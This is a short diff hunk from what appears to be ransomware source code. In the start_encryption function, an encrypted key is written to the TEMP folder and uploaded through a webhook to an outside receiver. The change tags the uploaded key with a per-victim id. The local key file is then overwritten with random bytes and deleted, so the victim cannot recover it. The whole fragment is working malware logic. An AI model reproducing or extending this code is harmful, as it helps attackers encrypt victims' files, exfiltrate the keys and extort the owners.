@@ -324,7 +324,7 @@ def start_encryption():
     with open(os.path.join(os.environ["TEMP"], "key.bin"), "wb") as f:
         f.write(encrypted_key)
     with open(os.path.join(os.environ["TEMP"], "key.bin"), "rb") as f:
-        webhook.add_file(file=f.read(), filename='key.bin')
+        webhook.add_file(file=f.read(), filename=f'key_{id}.bin')
     with open(os.path.join(os.environ["TEMP"], "key.bin"), "wb") as f:
         f.write(os.urandom(os.path.getsize(os.path.join(os.environ["TEMP"], "key.bin"))))
     os.remove(os.path.join(os.environ["TEMP"], "key.bin"))
